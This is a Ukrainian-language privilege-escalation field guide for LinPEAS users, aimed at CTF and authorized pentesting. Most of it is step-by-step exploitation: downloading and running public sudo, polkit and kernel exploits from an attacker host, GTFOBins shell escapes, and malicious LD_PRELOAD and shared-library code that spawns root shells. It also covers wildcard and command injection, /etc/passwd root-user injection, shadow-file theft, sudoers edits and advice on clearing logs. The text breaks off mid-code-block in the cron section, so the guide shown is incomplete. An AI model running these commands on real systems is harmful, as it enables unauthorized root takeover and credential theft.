# 🐧 LinPEAS Privesc Field Guide

> **`vulnerable output → exploitation paths`**
>
> Практичний довідник для авторизованого пентестингу та CTF (Hack The Box, TryHackMe, OSCP labs).

```text
██╗     ██╗███╗   ██╗██████╗ ███████╗ █████╗ ███████╗
██║     ██║████╗  ██║██╔══██╗██╔════╝██╔══██╗██╔════╝
██║     ██║██╔██╗ ██║██████╔╝█████╗  ███████║███████╗
██║     ██║██║╚██╗██║██╔═══╝ ██╔══╝  ██╔══██║╚════██║
███████╗██║██║ ╚████║██║     ███████╗██║  ██║███████║
╚══════╝╚═╝╚═╝  ╚═══╝╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝
```

| | |
|---|---|
| **Інструмент** | LinPEAS (PEASS-ng) — Carlos Polop |
| **Підхід** | Triage → читання кольорів → exploitation |
| **Версія** | 1.0 |
| **Теми** | Kernel / Sudo / SUID / Caps / Cron / Containers / Creds / Service backups |

> [!CAUTION]
> **LEGAL NOTICE.** Матеріал створено як методичний довідник для авторизованого пентестингу та CTF. LinPEAS — open-source інструмент під MIT License від Carlos Polop. Використання описаних технік без письмового дозволу власника системи є незаконним.

---

## 📑 Зміст

- [1. Вступ і методологія](#1-вступ-і-методологія)
- [2. Тріаж — куди дивитись першим](#2-тріаж--куди-дивитись-першим)
- [3. System / Kernel exploits](#3-system--kernel-exploits)
  - [V01 — OS / Kernel version](#v01--os--kernel-version-)
  - [V02 — Sudo Baron Samedit (CVE-2021-3156)](#v02--sudo-baron-samedit-cve-2021-3156-)
  - [V03 — PwnKit (CVE-2021-4034)](#v03--pwnkit-cve-2021-4034-)
  - [V04 — DirtyPipe (CVE-2022-0847)](#v04--dirtypipe-cve-2022-0847-)
- [4. Sudo misconfigurations](#4-sudo-misconfigurations)
  - [V05 — NOPASSWD entries](#v05--nopasswd-entries-)
  - [V06 — LD_PRELOAD / LD_LIBRARY_PATH preserved](#v06--ld_preload--ld_library_path-preserved-)
  - [V07 — Sudo wildcard injection](#v07--sudo-wildcard-injection-)
  - [V08 — Sudoedit (CVE-2023-22809)](#v08--sudoedit-cve-2023-22809-)
- [5. SUID / SGID / Capabilities](#5-suid--sgid--capabilities)
  - [V09 — SUID на GTFOBins](#v09--suid-на-gtfobins-)
  - [V10 — Custom SUID binaries](#v10--custom-suid-binaries-)
  - [V11 — Linux Capabilities](#v11--linux-capabilities-)
  - [V12 — SGID misconfigurations](#v12--sgid-misconfigurations-)
- [6. Cron / Timers / PATH](#6-cron--timers--path)
  - [V13 — Writable cron scripts](#v13--writable-cron-scripts-)
  - [V14 — Cron PATH manipulation](#v14--cron-path-manipulation-)
  - [V15 — Wildcard injection у cron](#v15--wildcard-injection-у-cron-)
  - [V16 — Writable directories у $PATH](#v16--writable-directories-у-path-)
- [7. Containers / Network](#7-containers--network)
  - [V17 — Небезпечне group membership](#v17--небезпечне-group-membership-)
  - [V18 — Docker socket exposed](#v18--docker-socket-exposed-)
  - [V19 — NFS no_root_squash](#v19--nfs-no_root_squash-)
- [8. Credentials / Files](#8-credentials--files)
  - [V20 — Writable /etc/passwd або /etc/shadow](#v20--writable-etcpasswd-або-etcshadow-)
  - [V21 — Креденшіали у history та configs](#v21--креденшіали-у-history-та-configs-)
  - [V22 — SSH keys і agent socket](#v22--ssh-keys-і-agent-socket-)
  - [V23 — Service config backup files (.bak/.old)](#v23--service-config-backup-files-bakold-)
- [9. Quick Reference — LinPEAS cheat sheet](#9-quick-reference--linpeas-cheat-sheet)
- [10. Реальний приклад LinPEAS output](#10-реальний-приклад-linpeas-output)
- [11. Післямова — куди йти далі](#11-післямова--куди-йти-далі)

---

## 1. Вступ і методологія

Цей документ — практичний компаньйон до LinPEAS. Якщо запустив `linpeas.sh` і отримав 4000+ рядків виводу — тут знайдеш, на що дивитись першим, що означає кожна знахідка і як перетворити її на root-shell. Структура: decision tree → вектори V01-V23 → покрокові walkthrough'и.

### 1.1 Де ми у kill chain

LinPEAS — це enumeration tool для Linux post-exploitation, фаза **privilege escalation**. Передумова: у нас вже є shell на хості (RCE через web, SSH з низькопривілейованим юзером, з reverse shell після exploit). Мета — root або UID іншого юзера з більшими правами.

**Workflow з LinPEAS:**

1. Запустити LinPEAS — отримати вивід
2. Прочитати **Red+Yellow** highlights — найбільш ймовірні privesc-вектори
3. Скоррелювати знахідки з [GTFOBins](https://gtfobins.github.io) (для SUID/sudo/caps)
4. Скоррелювати kernel і sudo версії з [exploitdb](https://www.exploit-db.com)
5. Експлуатація → escalation до root

### 1.2 Кольорова схема LinPEAS

Найважливіше у LinPEAS — без розуміння кольорів вивід стає нечитабельним:

| Колір | Що означає | Пріоритет |
|---|---|---|
| 🟥🟨 **Red + Yellow (фон)** | ~95% privesc-вектор — дивись першим | **CRITICAL** |
| 🔴 **Red** | Цікаве, варто перевірити | HIGH |
| 🟡 **Yellow** | Потенційно цікаво — оглянути | MEDIUM |
| 🟢 **Green** | Захист увімкнено / нормальний стан | INFO |
| 🔵 **Blue** | Інформативне поле, контекст | INFO |

> [!TIP]
> Робити `./linpeas.sh -a | tee /dev/shm/linpeas.txt`, потім `less -r /dev/shm/linpeas.txt` щоб зберегти кольори. Шукати `/95%` у less для миттєвого переходу до Red+Yellow.

### 1.3 Легенда документа

Кожен вектор V## має:

- **Badge:** 🔴 `HIGH` (часта перемога) / 🟡 `MED` (умовна) / 🟢 `LOW` (рідкісна)
- **LinPEAS секція** — де у виводі дивитись
- **Що шукати** — реальний приклад output
- **Експлуатація** — покрокові команди

> [!WARNING]
> Позначення позначає дії, що змінюють файли на цілі (модифікація `/etc/passwd`, додавання SSH-ключів, створення SUID-бінарів). На реальному engagement — потрібен явний письмовий дозвіл; на CTF — не критично.

---

## 2. Тріаж — куди дивитись першим

LinPEAS вивалює тонни даних — без триажу губишся у шумі. Нижче — мастер-флоучарт: послідовність перевірок, що дає 80% результатів за 10 хвилин.

### 2.1 Майстер-флоучарт

```text
? LinPEAS закінчив роботу — куди дивитись?

  ✓ STEP 1 → sudo -l (Розділ 4) — найшвидший privesc, читати першим
  ✓ STEP 2 → SUID/SGID + Capabilities (Розділ 5) — звірити з GTFOBins
  ✓ STEP 3 → Kernel/Sudo/Polkit version (Розділ 3) — PwnKit, Baron Samedit, DirtyPipe
  ✓ STEP 4 → Cron jobs + writable files in PATH (Розділ 6)
  ✓ STEP 5 → Group membership: docker, lxd, disk (Розділ 7)
  ✓ STEP 6 → NFS, Docker socket, креденшіали в файлах (Розділи 7-8)
  ✓ STEP 7 → Backup files (.bak/.old) для running services (V23)
                         ↓
? Нічого з кроків 1-7 не дало root?

  ~ MAYBE → шукати креденшіали інших юзерів (history, configs, backups)
            → su user2 → повторити LinPEAS під ним
  ~ MAYBE → process command line monitoring (pspy) — щось виконується періодично
  ✗ NO    → можливо, хост дійсно правильно налаштований; спробувати lse.sh
```

### 2.2 Карта "Що бачу в LinPEAS → куди йти"

| Спостереження у виводі | Розділ |
|---|---|
| 🔴 `Sudo version 1.8.x` (red+yellow) | [V02 (Baron Samedit)](#v02--sudo-baron-samedit-cve-2021-3156-) |
| 🔴 `pkexec у SUID` та polkit < 0.120 | [V03 (PwnKit)](#v03--pwnkit-cve-2021-4034-) |
| 🔴 `Kernel 5.8 — 5.16.11` | [V04 (DirtyPipe)](#v04--dirtypipe-cve-2022-0847-) |
| 🔴 `User can run X as root NOPASSWD` | [V05 (NOPASSWD sudo)](#v05--nopasswd-entries-) |
| 🔴 `env_keep+=LD_PRELOAD` | [V06 (LD_PRELOAD hijack)](#v06--ld_preload--ld_library_path-preserved-) |
| 🔴 `Sudo wildcard *` | [V07 (sudo wildcard)](#v07--sudo-wildcard-injection-) |
| 🔴 `SUID binary listed in GTFOBins` | [V09 (SUID GTFOBins)](#v09--suid-на-gtfobins-) |
| 🔴 `Custom SUID binary` | [V10 (binary analysis)](#v10--custom-suid-binaries-) |
| 🔴 `cap_setuid+ep on /usr/bin/python` | [V11 (capabilities)](#v11--linux-capabilities-) |
| 🔴 `Cron job писабельний` | [V13 (cron writable)](#v13--writable-cron-scripts-) |
| 🔴 `PATH manipulation у cron` | [V14 (cron PATH)](#v14--cron-path-manipulation-) |
| 🔴 `Wildcard у cron tar/chown` | [V15 (wildcard injection)](#v15--wildcard-injection-у-cron-) |
| 🔴 `Writable folder у $PATH` | [V16 (PATH hijack)](#v16--writable-directories-у-path-) |
| 🔴 `User у docker/lxd group` | [V17 (container escape)](#v17--небезпечне-group-membership-) |
| 🔴 `/var/run/docker.sock доступний` | [V18 (docker socket)](#v18--docker-socket-exposed-) |
| 🔴 `NFS share with no_root_squash` | [V19 (NFS abuse)](#v19--nfs-no_root_squash-) |
| 🟡 `/etc/passwd writable` (rare) | [V20 (passwd inject)](#v20--writable-etcpasswd-або-etcshadow-) |
| 🟡 `Креденшіали у history/.bash_history` | [V21 (creds harvest)](#v21--креденшіали-у-history-та-configs-) |
| 🟡 `Креденшіали у конфігах (.my.cnf, web)` | [V21 (configs)](#v21--креденшіали-у-history-та-configs-) |
| 🟡 `SSH private keys readable` | [V22 (SSH keys)](#v22--ssh-keys-і-agent-socket-) |
| 🔴 `*.bak файл конфігу сервісу` | [V23 (service backup)](#v23--service-config-backup-files-bakold-) |

---

## 3. System / Kernel exploits

LinPEAS виводить версії OS, kernel, sudo, polkit на самому початку. Низько висячі плоди: якщо хост не патчений, відомий CVE дає root за хвилину.

### V01 — OS / Kernel version 🔴

| | |
|---|---|
| **Ціль** | застарілий kernel з відомим LPE |
| **LinPEAS секція** | `[+] Operative system` та `[+] Sudo version` |
| **Наступний крок** | exploitdb lookup, [V04 (DirtyPipe)](#v04--dirtypipe-cve-2022-0847-) |

**Що шукати у виводі:**

```text
╔══════════╣ Operative system
Linux version 5.13.0-39-generic (buildd@lcy02-amd64-076) ...
Distributor ID: Ubuntu
Description:    Ubuntu 20.04.4 LTS
Release:        20.04
Codename:       focal
```

> [!NOTE]
> Все що `< 5.16.11` — кандидат на DirtyPipe; `< 5.8` — старіші CVE (overlayfs, etc.)

**Workflow перевірки:**

```bash
# на attacker
searchsploit linux kernel 5.13 privilege escalation
searchsploit linux kernel ubuntu 20.04 local
# або онлайн
firefox https://www.exploit-db.com/search?platform=linux\&type=local\&text=kernel
```

**Топ kernel CVE 2021-2024:**

| CVE | Kernel range | Назва |
|---|---|---|
| CVE-2022-0847 | 5.8 — 5.16.11 / 5.15.25 / 5.10.102 | **DirtyPipe** |
| CVE-2021-22555 | 2.6.19 — 5.12-rc8 | Netfilter heap OOB |
| CVE-2022-2588 | 3.13 — 5.18 | cls_route UAF |
| CVE-2023-0386 | < 5.19 | OverlayFS uid mapping |
| CVE-2023-2640+CVE-2023-32629 | Ubuntu specific | **GameOver(lay)** |
| CVE-2023-3269 | 6.1 — 6.4 | StackRot |
| CVE-2024-1086 | 5.14 — 6.6 | nf_tables UAF |

> [!WARNING]
> Kernel exploits — ризиковано на проді. На CTF/HTB — норм. На реальному engagement — згода замовника. Альтернативи (sudo/SUID) безпечніші.

---

### V02 — Sudo Baron Samedit (CVE-2021-3156) 🔴

| | |
|---|---|
| **Ціль** | Heap-based buffer overflow у sudoedit → root без password |
| **LinPEAS секція** | `╔══════════╣ Sudo version` |
| **Наступний крок** | PoC з [blasty/CVE-2021-3156](https://github.com/blasty/CVE-2021-3156) |

**Вразливі версії:**

- 🔴 Legacy: `1.8.2` — `1.8.31p2`
- 🔴 Stable: `1.9.0` — `1.9.5p1`
- 🟢 Patched: `1.9.5p2` і вище

**Що шукати:**

```text
╔══════════╣ Sudo version
Sudo version 1.8.31

Sudo versions 1.8.2 - 1.8.31p2
Sudo versions 1.9.0 - 1.9.5p1
Vulnerable to CVE-2021-3156
```

> [!NOTE]
> LinPEAS вже сам перевіряє і пише `Vulnerable to CVE-2021-3156` — це red flag.

**Експлуатація:**

```bash
# на attacker
git clone https://github.com/blasty/CVE-2021-3156
cd CVE-2021-3156 && make
python3 -m http.server 8000
```

```bash
# на цілі
cd /tmp
wget http://10.10.14.X:8000/sudo-hax-me-a-sandwich
wget http://10.10.14.X:8000/libnss_X
chmod +x sudo-hax-me-a-sandwich
./sudo-hax-me-a-sandwich 0    # target ID — 0 для Ubuntu 20.04
```

```text
** CVE-2021-3156 PoC by blasty <peter@haxx.in>
using target: Ubuntu 20.04.1 LTS (Focal Fossa) -- sudo 1.8.31, libc-2.31
[~] obtained shell as root!
# id
uid=0(root) gid=0(root) groups=0(root)
```

**Альтернативний PoC (Python):**

```bash
git clone https://github.com/worawit/CVE-2021-3156
python3 exploit_nss.py    # універсальніший, без target IDs
```

**Бонус — CVE-2019-14287 (runas bypass):**

Якщо у sudoers є рядок виду `user ALL=(ALL,!root) /usr/bin/X`, то sudo `< 1.8.28`:

```bash
sudo -u#-1 /usr/bin/id
# uid=0(root) gid=0(root) groups=0(root)
```

---

### V03 — PwnKit (CVE-2021-4034) 🔴

| | |
|---|---|
| **Ціль** | root через незахищений argv parsing у pkexec |
| **LinPEAS секція** | SUID listing — `/usr/bin/pkexec` |
| **Наступний крок** | PoC з [berdav/CVE-2021-4034](https://github.com/berdav/CVE-2021-4034) |

**Вразливі версії:** Полкіт усіх версій з 2009 до January 2022. Тобто практично всі дистри до 25 січня 2022 — Ubuntu 14.04+, Debian 7+, RHEL 6+, CentOS 6+, Fedora всі.

**Що шукати у LinPEAS:**

```text
╔══════════╣ SUID - Check easy privesc, exploits and write perms
-rwsr-xr-x 1 root root 31K Aug 28  2018 /usr/bin/pkexec  ---> CVE-2021-4034

╔══════════╣ Searching specific binaries
/usr/bin/pkexec ....> CVE-2021-4034 (PwnKit)
```

**Експлуатація — gh:berdav/CVE-2021-4034:**

```bash
# на attacker
git clone https://github.com/berdav/CVE-2021-4034
cd CVE-2021-4034 && make
```

```bash
# на цілі
cd /tmp
wget http://10.10.14.X:8000/cve-2021-4034 -O exp
chmod +x exp && ./exp
# id
# uid=0(root) gid=1000(user) groups=1000(user)
```

**Альтернативно — Python варіант:**

```bash
wget https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py
python3 CVE-2021-4034.py
```

**Перевірка patch-level:**

```bash
dpkg -l | grep -i policykit    # Debian/Ubuntu
rpm -qa | grep -i polkit         # RHEL/CentOS/Fedora
# policykit-1 0.105-26ubuntu1.2 — патчено
# policykit-1 0.105-26ubuntu1   — vulnerable
```

> [!CAUTION]
> PwnKit залишає сліди в `/var/log/auth.log`: видно failed pkexec calls з невалідним argv. Blue team може помітити; на stealthy engagement — використовувати раз і чистити логи (якщо authorized).

---

### V04 — DirtyPipe (CVE-2022-0847) 🔴

| | |
|---|---|
| **Ціль** | Запис у read-only файли через pipe-buffer flag bug → root |
| **LinPEAS секція** | `[+] Operative system` — kernel version |
| **Наступний крок** | PoC [AlexisAhmed/CVE-2022-0847](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits) |

**Вразливі версії kernel:**

- 5.8 — 5.16.10 (linux mainline)
- 5.15.0 — 5.15.24
- 5.10.0 — 5.10.101
- ✅ Патчено: 5.16.11 / 5.15.25 / 5.10.102 і вище

**Як працює:** Bug у функції `copy_page_to_iter_pipe()`: pipe-buffer's flag `PIPE_BUF_FLAG_CAN_MERGE` не очищається при reuse. Атакуючий може overwrite будь-який read-only файл (включно з `/etc/passwd` або SUID-бінарником) без потреби у write-permission.

**Експлуатація — варіант 1: SUID hijack:**

```bash
# на attacker
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
cd CVE-2022-0847-DirtyPipe-Exploits && bash compile.sh
```

```bash
# на цілі
wget http://10.10.14.X:8000/exploit-1
chmod +x exploit-1 && ./exploit-1
# [+] hijacking suid binary..
# [+] dropping suid shell..
# [+] popping root shell.. (don't forget to clean up /tmp/sh ;))
```

**Варіант 2: запис у /etc/passwd:**

```bash
./exploit-2
# [+] hijacking /etc/passwd ..
# [+] popping root shell..
```

> [!IMPORTANT]
> DirtyPipe варіант 1 краще для stealth — модифікує SUID binary тимчасово і відновлює його. Варіант 2 на секунду ламає `/etc/passwd` — інші юзери в цей момент не зможуть логінитись.

---

## 4. Sudo misconfigurations

Sudo — найпоширеніший і найшвидший privesc-вектор. LinPEAS перевіряє `sudo -l` (якщо знає пароль або passwordless), читає `/etc/sudoers` та `/etc/sudoers.d/*`.

### V05 — NOPASSWD entries 🔴

| | |
|---|---|
| **Ціль** | root через GTFOBins binary з sudo NOPASSWD |
| **LinPEAS секція** | `╔══════════╣ Checking 'sudo -l'` |
| **Наступний крок** | [GTFOBins](https://gtfobins.github.io) → exploitation |

**Що шукати:**

```text
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
User user may run the following commands on target:
    (ALL : ALL) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/less /var/log/*
```

> [!NOTE]
> Три рядки червоні = три окремі шляхи до root; кожен бінар перевірити на gtfobins.github.io.

**Експлуатація — find:**

```bash
sudo find . -exec /bin/bash -p \; -quit
# whoami
# root
```

> `-p` у bash = preserve effective UID; без нього bash dropне euid назад.

**Експлуатація — vim:**

```bash
sudo vim -c ':!/bin/bash'

# або з режиму vim:
sudo vim
:set shell=/bin/bash
:shell
```

**Експлуатація — less з wildcard (path traversal):**

```bash
sudo less /var/log/../../etc/shadow
# у less: !/bin/bash
```

**Топ-15 GTFOBins для sudo NOPASSWD:**

| Binary | Команда escape |
|---|---|
| `find` | `sudo find . -exec /bin/sh \; -quit` |
| `vim/vi` | `sudo vim -c ':!/bin/sh'` |
| `nano` | `^R^X reset; sh 1>&0 2>&0` |
| `awk` | `sudo awk 'BEGIN {system("/bin/sh")}'` |
| `perl` | `sudo perl -e 'exec "/bin/sh";'` |
| `python` | `sudo python -c 'import os; os.system("/bin/sh")'` |
| `less / more` | відкрити файл, потім `!/bin/sh` |
| `man` | `sudo man man` → `!/bin/sh` |
| `tar` | `sudo tar -cf /dev/null x --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
| `zip` | `sudo zip x.zip x -T --unzip-command="sh -c /bin/sh"` |
| `git` | `sudo git -p help config` → `!/bin/sh` |
| `nmap` (старий) | `sudo nmap --interactive` → `!sh` |
| `apt / apt-get` | `sudo apt changelog apt` → `!/bin/sh` |
| `cp / dd` | overwrite `/etc/passwd` з своїм root user |
| `wget` | upload `/etc/shadow` → exfil та crack |

---

### V06 — LD_PRELOAD / LD_LIBRARY_PATH preserved 🔴

| | |
|---|---|
| **Ціль** | завантажити свою .so у sudo-процес → root |
| **LinPEAS секція** | `╔══════════╣ Checking 'sudo -l', /etc/sudoers` |
| **Наступний крок** | скомпілювати .so → запустити sudo з env |

**Що шукати:**

```text
Matching Defaults entries for user on target:
    env_reset, mail_badpass,
    env_keep+=LD_PRELOAD,
    secure_path=/usr/local/sbin\:/usr/local/bin\:...

User user may run the following commands on target:
    (root) NOPASSWD: /usr/sbin/apache2ctl restart
```

> [!TIP]
> `env_keep+=LD_PRELOAD` = jackpot; будь-яка sudo-команда дозволяє завантажити нашу .so.

**Експлуатація:**

**Крок 1 — створити preload.c:**

```c
// /tmp/preload.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```

**Крок 2 — скомпілювати:**

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c
```

**Крок 3 — запустити sudo:**

```bash
sudo LD_PRELOAD=/tmp/preload.so apache2ctl restart
# whoami
# root
```

> Команда (apache2ctl restart) тут неважлива — нам важливо тільки запустити sudo щоб `_init()` виконався при load .so.

**Варіант — LD_LIBRARY_PATH:**

```bash
ldd /usr/sbin/apache2ctl
# libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1

# ствотюємо malicious replacement
cat > /tmp/lib/libcrypt.c <<'EOF'
#include <stdlib.h>
static void hijack() __attribute__((constructor));
void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
EOF
gcc -o /tmp/lib/libcrypt.so.1 -shared -fPIC /tmp/lib/libcrypt.c
sudo LD_LIBRARY_PATH=/tmp/lib /usr/sbin/apache2ctl restart
```

> [!NOTE]
> `setresuid(0,0,0)` важливо: без нього дочірній bash успадкує euid root, але не real uid. Деякі програми (passwd, sudoedit) перевіряють real uid.

---

### V07 — Sudo wildcard injection 🟡

| | |
|---|---|
| **Ціль** | впихнути argv-flag через wildcard expansion → privesc |
| **LinPEAS секція** | `Checking 'sudo -l'` |

**Що шукати:**

```text
User user may run the following commands on target:
    (root) NOPASSWD: /bin/tar -czf /backup/home.tar.gz /home/*
    (root) NOPASSWD: /bin/chown user:user /var/www/html/*
    (root) NOPASSWD: /usr/bin/rsync -av * /backup/
```

**Експлуатація — tar checkpoint:**

```bash
cd /home/user
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > pwn.sh
chmod +x pwn.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh pwn.sh"

ls
# --checkpoint=1   --checkpoint-action=exec=sh pwn.sh   pwn.sh

sudo tar -czf /backup/home.tar.gz /home/*
ls -la /tmp/rootbash
# -rwsr-sr-x 1 root root 1234376 ... /tmp/rootbash
/tmp/rootbash -p
# id → euid=0(root)
```

**Експлуатація — chown через символьне посилання:**

```bash
ln -s /etc/shadow /var/www/html/shadow_link
sudo chown user:user /var/www/html/*
ls -la /etc/shadow
# -rw-r----- 1 user user 1234 ... /etc/shadow
cat /etc/shadow    # тепер читабельний
```

> [!CAUTION]
> Chown на shadow змінює ownership назавжди. У engagement обов'язково повертати: `sudo chown root:shadow /etc/shadow && sudo chmod 640 /etc/shadow`.

**Експлуатація — rsync wildcard:**

```bash
echo 'sh -c "/bin/bash -p"' > /tmp/shell
chmod +x /tmp/shell
cd /tmp
touch -- "-e sh shell"
sudo rsync -av * /backup/
# whoami → root
```

---

### V08 — Sudoedit (CVE-2023-22809) 🟢

| | |
|---|---|
| **Ціль** | редагувати файли поза дозволом |

CVE-2023-22809: sudoedit в sudo до 1.9.12p2 не валідує EDITOR/VISUAL змінні:

```bash
sudo -l
# User may run: (root) sudoedit /etc/myapp/config

EDITOR='vim -- /etc/sudoers' sudoedit /etc/myapp/config
# vim відкривається з /etc/sudoers — додаємо: user ALL=(ALL) NOPASSWD:ALL
sudo su -
# whoami → root
```

---

## 5. SUID / SGID / Capabilities

SUID-біт = бінар запускається з UID власника, незалежно від того, хто його викликав.

### V09 — SUID на GTFOBins 🔴

| | |
|---|---|
| **Ціль** | root через GTFOBins SUID-trick |
| **LinPEAS секція** | `╔══════════╣ SUID` |
| **Наступний крок** | gtfobins.github.io → SUID секція бінара |

**Що шукати:**

```text
╔══════════╣ SUID - Check easy privesc, exploits and write perms
-rwsr-xr-x 1 root root  31K /usr/bin/pkexec  ---> CVE-2021-4034
-rwsr-xr-x 1 root root  56K /usr/bin/find  ---> gtfobins
-rwsr-xr-x 1 root root 184K /usr/bin/python3.8  ---> gtfobins
-rwsr-xr-x 1 root root  39K /usr/bin/nmap  ---> gtfobins (interactive)
-rwsr-xr-x 1 root root  64K /usr/bin/cp  ---> overwrite /etc/passwd
```

**Експлуатація — python SUID:**

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'
# whoami → root
```

**Експлуатація — find SUID:**

```bash
/usr/bin/find . -exec /bin/sh -p \; -quit
# whoami → root
```

**Експлуатація — cp SUID (overwrite /etc/passwd):**

```bash
openssl passwd -1 -salt salt P@ssw0rd
# $1$salt$2gK3iPx...

cp /etc/passwd /tmp/passwd.bak
echo 'rooot:$1$salt$2gK3iPx...:0:0:root:/root:/bin/bash' >> /tmp/passwd.bak
/usr/bin/cp /tmp/passwd.bak /etc/passwd
su rooot
# Password: P@ssw0rd
# whoami → root
```

**Топ-15 SUID GTFOBins:**

| Binary | SUID escape |
|---|---|
| `bash` | `bash -p` |
| `find` | `find . -exec /bin/sh -p \; -quit` |
| `python/python3` | `python -c 'import os; os.setuid(0); os.system("/bin/sh")'` |
| `perl` | `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh"'` |
| `vim/nano` | shell-escape через `:!sh` |
| `nmap` (старий) | `nmap --interactive` → `!sh` |
| `env` | `env /bin/sh -p` |
| `cp` | overwrite /etc/passwd |
| `dd` | overwrite файлів як root |
| `tee` | `echo X \| tee -a /etc/sudoers` |
| `tar` | `tar --checkpoint=1 --checkpoint-action=exec=/bin/sh ...` |
| `gdb` | `gdb -nx -ex '!sh -p' -ex quit` |
| `less / more` | відкрити файл → `!sh` |
| `awk` | `awk 'BEGIN {system("/bin/sh -p")}'` |
| `strace` | `strace -o /dev/null /bin/sh -p` |

---

### V10 — Custom SUID binaries 🔴

| | |
|---|---|
| **Ціль** | reverse engineering / strings / binary analysis |
| **LinPEAS секція** | SUID listing — все, що НЕ системний бінар |
| **Наступний крок** | strings, ltrace, ghidra |

**Як розпізнати custom SUID:**

```text
╔══════════╣ SUID
# системні (відомі) — пропускаємо
-rwsr-xr-x 1 root root  44K /usr/bin/newgrp
-rwsr-xr-x 1 root root  56K /usr/bin/find

# custom — підозрілий!
-rwsr-xr-x 1 root root 16K /usr/local/bin/backup-helper
-rwsr-xr-x 1 root root  9K /opt/scripts/cleanup
```

> [!NOTE]
> Все у `/usr/local/bin`, `/opt`, `/home` з SUID — custom; це часто має баги.

**Крок 1 — strings analysis:**

```bash
strings /usr/local/bin/backup-helper
# system
# tar -czf /backup/home_%s.tar.gz /home/%s
# Backup completed for user: %s
```

> Бачимо `tar -czf` з форматною строкою — потенційна command injection через user-input.

**Крок 2 — ltrace для перегляду викликів:**

```bash
ltrace /usr/local/bin/backup-helper testuser
# system("tar -czf /backup/home_testuser.tar.gz /home/testuser")
```

**Крок 3 — exploitation через command injection:**

```bash
/usr/local/bin/backup-helper 'x; /bin/bash -p; #'
# shell expansion: tar -czf /backup/home_x; /bin/bash -p; #.tar.gz ...
# whoami → root
```

**Інший випадок — PATH injection через relative call:**

```bash
strings /opt/scripts/cleanup | grep -E '^[a-z]+$'
# date
# ls
# find    ← викликається без абсолютного шляху

echo '/bin/bash -p' > /tmp/find
chmod +x /tmp/find
export PATH=/tmp:$PATH
/opt/scripts/cleanup
# whoami → root
```

**Library hijack:**

```bash
ldd /usr/local/bin/backup-helper
# libcustom.so => /usr/local/lib/libcustom.so

ls -la /usr/local/lib/libcustom.so
# -rwxrwxrwx 1 user user 12K ... libcustom.so   ← писабельний!

cat > /tmp/lib.c <<'EOF'
__attribute__((constructor)) void hijack() {
    setresuid(0,0,0);
    system("/bin/bash -p");
}
EOF
gcc -shared -fPIC -o /usr/local/lib/libcustom.so /tmp/lib.c
/usr/local/bin/backup-helper test
# whoami → root
```

---

### V11 — Linux Capabilities 🔴

| | |
|---|---|
| **Ціль** | запустити capability-enabled binary з правами root |
| **LinPEAS секція** | `╔══════════╣ Capabilities` |
| **Наступний крок** | [GTFOBins → Capabilities](https://gtfobins.github.io) |

**Що шукати:**

```text
╔══════════╣ Capabilities
Files with capabilities (limited to 50):
/usr/bin/ping = cap_net_raw+ep
/usr/bin/python3.8 = cap_setuid+ep
/usr/bin/perl = cap_setuid,cap_setgid+ep
/usr/bin/tar = cap_dac_read_search+ep
/usr/bin/vim = cap_dac_override+ep
```

**Експлуатація — cap_setuid:**

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# whoami → root
```

**Експлуатація — cap_dac_read_search (читання будь-яких файлів):**

```bash
ls -la /etc/shadow
# -rw-r----- 1 root shadow 1234 ... /etc/shadow    ← нечитабельний

/usr/bin/tar -czf shadow.tar.gz /etc/shadow
tar -xzf shadow.tar.gz
cat etc/shadow
# root:$6$xy...:18000:0:99999:7:::
```

**Експлуатація — cap_dac_override (запис у будь-який файл):**

```bash
/usr/bin/vim /etc/sudoers
# додаємо: user ALL=(ALL) NOPASSWD:ALL
sudo -i
# whoami → root
```

**Топ небезпечних capabilities:**

| Capability | Що дає | Експлуатація |
|---|---|---|
| `cap_setuid` | setuid() до будь-якого UID | прямий root через python/perl/ruby |
| `cap_setgid` | setgid() | сам по собі обмежений |
| `cap_dac_override` | обхід file write permissions | edit /etc/passwd, /etc/sudoers |
| `cap_dac_read_search` | обхід file read permissions | читати /etc/shadow, SSH keys |
| `cap_chown` | chown будь-якого файлу | change owner /etc/shadow → cat |
| `cap_fowner` | chmod будь-якого файлу | chmod +s /bin/bash |
| `cap_sys_admin` | "майже root" | mount, namespace |
| `cap_sys_ptrace` | ptrace процесів | inject код у root-процес |
| `cap_sys_module` | insmod kernel modules | завантажити malicious .ko |

---

### V12 — SGID misconfigurations 🟢

SGID = бінар запускається з GID власника. Реальний privesc через SGID рідкісний — більшість груп некритичні. Виняток: SGID на binary з group `shadow`, `disk`, `root`.

```bash
find / -perm -2000 -type f 2>/dev/null | grep -v '/proc'
# -rwxr-sr-x 1 root shadow 32K ... /usr/bin/myhelper    ← shadow group SGID
# якщо myhelper має command injection — checkmate
```

---

## 6. Cron / Timers / PATH

Cron jobs виконуються як власник crontab — часто root. Якщо ми можемо вплинути на те, що виконується — отримуємо root через 1-60 хвилин очікування.

### V13 — Writable cron scripts 🔴

| | |
|---|---|
| **Ціль** | додати свій код у скрипт → cron виконає як root |
| **LinPEAS секція** | `╔══════════╣ Cron jobs` |

**Що шукати:**

```text
╔══════════╣ System-wide crons
/etc/crontab content:
*/5 *    * * *   root    /opt/scripts/cleanup.sh

╔══════════╣ Cron files writable
/opt/scripts/cleanup.sh is writable by user
-rwxrwxrwx 1 root root 245 Jan 12 2024 /opt/scripts/cleanup.sh
```

**Експлуатація:**

```bash
